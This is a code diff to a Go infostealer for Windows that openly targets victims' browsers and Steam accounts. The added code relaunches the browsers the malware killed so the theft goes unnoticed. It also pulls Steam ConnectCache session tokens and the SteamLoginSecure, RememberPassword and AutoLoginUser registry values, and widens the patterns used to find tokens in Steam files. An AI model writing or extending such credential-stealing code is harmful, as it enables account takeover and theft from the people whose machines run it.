@@ -144,6 +144,9 @@ func runStealer() string {
 		results["_errors"] = "no data collected"
 	}
 
+	// Restart any browsers we killed
+	go restartBrowsers()
+
 	out, _ := json.Marshal(results)
 	return string(out)
 }
@@ -173,6 +176,44 @@ func killBrowserProcess(exeName string) {
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	_ = cmd.Run()
 	time.Sleep(500 * time.Millisecond)
+}
+
+func restartBrowsers() {
+	for exe := range browserKilled {
+		if exe == "" {
+			continue
+		}
+		// Find the browser path from common locations
+		var exePath string
+		localAppData := os.Getenv("LOCALAPPDATA")
+		programFiles := os.Getenv("ProgramFiles")
+		programFilesX86 := os.Getenv("ProgramFiles(x86)")
+		appData := os.Getenv("APPDATA")
+
+		searchPaths := map[string][]string{
+			"chrome.exe":   {filepath.Join(localAppData, "Google", "Chrome", "Application", "chrome.exe"), filepath.Join(programFiles, "Google", "Chrome", "Application", "chrome.exe")},
+			"msedge.exe":   {filepath.Join(programFilesX86, "Microsoft", "Edge", "Application", "msedge.exe"), filepath.Join(programFiles, "Microsoft", "Edge", "Application", "msedge.exe")},
+			"brave.exe":    {filepath.Join(localAppData, "BraveSoftware", "Brave-Browser", "Application", "brave.exe"), filepath.Join(programFiles, "BraveSoftware", "Brave-Browser", "Application", "brave.exe")},
+			"opera.exe":    {filepath.Join(localAppData, "Programs", "Opera", "opera.exe"), filepath.Join(appData, "Opera Software", "Opera Stable", "opera.exe")},
+			"vivaldi.exe":  {filepath.Join(localAppData, "Vivaldi", "Application", "vivaldi.exe")},
+			"firefox.exe":  {filepath.Join(programFiles, "Mozilla Firefox", "firefox.exe"), filepath.Join(programFilesX86, "Mozilla Firefox", "firefox.exe")},
+		}
+
+		if paths, ok := searchPaths[exe]; ok {
+			for _, p := range paths {
+				if _, err := os.Stat(p); err == nil {
+					exePath = p
+					break
+				}
+			}
+		}
+
+		if exePath != "" {
+			c := exec.Command(exePath)
+			c.SysProcAttr = &syscall.SysProcAttr{HideWindow: false}
+			_ = c.Start()
+		}
+	}
 }
 
 var browserKilled = map[string]bool{}
@@ -570,17 +611,12 @@ func stealUserInfo() string {
 func stealSteamTokens() string {
 	var sb strings.Builder
 
-	regKeys := []string{
-		"Software\\Valve\\Steam\\ConnectCache",
-		"Software\\Valve\\Steam",
-	}
-	for _, regPath := range regKeys {
-		var hKey syscall.Handle
-		keyPath, _ := syscall.UTF16PtrFromString(regPath)
-		err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
-		if err != nil {
-			continue
-		}
+	// Only read ConnectCache - these are actual session tokens
+	regPath := "Software\\Valve\\Steam\\ConnectCache"
+	var hKey syscall.Handle
+	keyPath, _ := syscall.UTF16PtrFromString(regPath)
+	err := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath, 0, syscall.KEY_READ, &hKey)
+	if err == nil {
 		advapi32 := syscall.NewLazyDLL("advapi32.dll")
 		regEnumValue := advapi32.NewProc("RegEnumValueW")
 		for idx := uint32(0); ; idx++ {
@@ -605,6 +641,7 @@ func stealSteamTokens() string {
 			name := syscall.UTF16ToString(nameBuf[:nameLen])
 			var token string
 			if vtype == 1 || vtype == 2 {
+				// REG_SZ or REG_EXPAND_SZ: data is UTF-16LE
 				if dataLen >= 2 {
 					u16 := make([]uint16, dataLen/2)
 					for i := range u16 {
@@ -613,17 +650,69 @@ func stealSteamTokens() string {
 					token = syscall.UTF16ToString(u16)
 				}
 			} else {
-				token = string(dataBuf[:dataLen])
-				for len(token) > 0 && token[len(token)-1] == 0 {
-					token = token[:len(token)-1]
-				}
+				// Binary data (ConnectCache values are typically binary)
+				token = base64.StdEncoding.EncodeToString(dataBuf[:dataLen])
 			}
 			token = strings.TrimSpace(token)
-			if len(token) > 20 {
-				sb.WriteString(fmt.Sprintf("[REG:%s/%s] %s\n", regPath, name, token))
+			if len(token) > 10 {
+				sb.WriteString(fmt.Sprintf("[ConnectCache:%s] %s\n", name, token))
 			}
 		}
 		syscall.RegCloseKey(hKey)
+	}
+
+	// Also read SteamLoginSecure from registry
+	steamRegPath := "Software\\Valve\\Steam"
+	var hKey2 syscall.Handle
+	keyPath2, _ := syscall.UTF16PtrFromString(steamRegPath)
+	err2 := syscall.RegOpenKeyEx(syscall.HKEY_CURRENT_USER, keyPath2, 0, syscall.KEY_READ, &hKey2)
+	if err2 == nil {
+		advapi32 := syscall.NewLazyDLL("advapi32.dll")
+		regQueryValue := advapi32.NewProc("RegQueryValueExW")
+		wantKeys := []string{"SteamLoginSecure", "RememberPassword", "AutoLoginUser"}
+		for _, wk := range wantKeys {
+			wkPtr, _ := syscall.UTF16PtrFromString(wk)
+			dataLen := uint32(16384)
+			dataBuf := make([]byte, dataLen)
+			var vtype uint32
+			r, _, _ := regQueryValue.Call(
+				uintptr(hKey2),
+				uintptr(unsafe.Pointer(wkPtr)),
+				0,
+				uintptr(unsafe.Pointer(&vtype)),
+				uintptr(unsafe.Pointer(&dataBuf[0])),
+				uintptr(unsafe.Pointer(&dataLen)),
+			)
+			if r != 0 {
+				continue
+			}
+			var val string
+			if vtype == 1 || vtype == 2 {
+				if dataLen >= 2 {
+					u16 := make([]uint16, dataLen/2)
+					for i := range u16 {
+						u16[i] = uint16(dataBuf[i*2]) | uint16(dataBuf[i*2+1])<<8
+					}
+					val = syscall.UTF16ToString(u16)
+				}
+			} else if vtype == 4 {
+				// DWORD
+				if dataLen >= 4 {
+					v := uint32(dataBuf[0]) | uint32(dataBuf[1])<<8 | uint32(dataBuf[2])<<16 | uint32(dataBuf[3])<<24
+					val = fmt.Sprintf("%d", v)
+				}
+			} else {
+				val = string(dataBuf[:dataLen])
+				for len(val) > 0 && val[len(val)-1] == 0 {
+					val = val[:len(val)-1]
+				}
+			}
+			val = strings.TrimSpace(val)
+			if len(val) > 0 {
+				sb.WriteString(fmt.Sprintf("[Steam:%s] %s\n", wk, val))
+			}
+		}
+		syscall.RegCloseKey(hKey2)
 	}
 
 	var steamPaths []string
@@ -677,7 +766,7 @@ func stealSteamTokens() string {
 				isToken := strings.Contains(line, ".eyA") || strings.Contains(line, ".eyJ") ||
 					strings.Contains(lower, "refresh_token") || strings.Contains(lower, "access_token") ||
 					strings.Contains(lower, "webapitoken") || strings.Contains(lower, "steamloginsecure") ||
-					strings.Contains(lower, "account_name") || strings.Contains(lower, "personaname")
+					strings.Contains(lower, "steamid") || strings.Contains(lower, "account_name")
 				if !isToken {
 					continue
 				}
